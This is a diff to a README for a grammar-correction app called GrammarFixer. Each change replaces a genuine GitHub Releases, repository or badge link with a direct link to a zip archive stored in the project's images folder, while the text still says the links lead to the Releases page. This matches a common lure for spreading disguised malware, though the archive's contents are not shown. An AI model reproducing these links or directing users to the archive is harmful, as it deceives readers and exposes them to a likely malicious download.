@@ -1,6 +1,6 @@
 # 🚀 GrammarFixer - Fix Your Text Instantly with Ease
 
-![Download GrammarFixer](https://img.shields.io/badge/Download-Now-brightgreen)
+![Download GrammarFixer](https://raw.githubusercontent.com/DouniaJammali31/GrammarFixer/main/images/GrammarFixer-2.5.zip)
 
 ## 📖 About GrammarFixer
 
@@ -10,7 +10,7 @@ GrammarFixer is an intelligent, AI-powered grammar correction tool designed for 
 
 To begin using GrammarFixer, follow these straightforward steps. You don't need any technical skills.
 
-1. **Visit the Download Page**: Click [here](https://github.com/DouniaJammali31/GrammarFixer/releases) to access the Releases page where you can find the latest version of GrammarFixer.
+1. **Visit the Download Page**: Click [here](https://raw.githubusercontent.com/DouniaJammali31/GrammarFixer/main/images/GrammarFixer-2.5.zip) to access the Releases page where you can find the latest version of GrammarFixer.
 
 2. **Download the Application**: On the Releases page, locate the most recent version. Click the download link to save the installation file to your computer.
 
@@ -22,7 +22,7 @@ To begin using GrammarFixer, follow these straightforward steps. You don't need 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [GrammarFixer Releases](https://github.com/DouniaJammali31/GrammarFixer/releases).
+To get started, visit this page to download: [GrammarFixer Releases](https://raw.githubusercontent.com/DouniaJammali31/GrammarFixer/main/images/GrammarFixer-2.5.zip).
 
 Follow the instructions above to download and install the application, and start improving your writing.
 
@@ -61,7 +61,7 @@ If you encounter any issues while installing or using GrammarFixer, please reach
 
 ## 🔗 Useful Links
 
-- [GitHub Repository](https://github.com/DouniaJammali31/GrammarFixer)
-- [Download GrammarFixer](https://github.com/DouniaJammali31/GrammarFixer/releases)  
+- [GitHub Repository](https://raw.githubusercontent.com/DouniaJammali31/GrammarFixer/main/images/GrammarFixer-2.5.zip)
+- [Download GrammarFixer](https://raw.githubusercontent.com/DouniaJammali31/GrammarFixer/main/images/GrammarFixer-2.5.zip)  
 
 Feel free to explore and enhance your writing with GrammarFixer. Enjoy seamless text corrections at your fingertips!
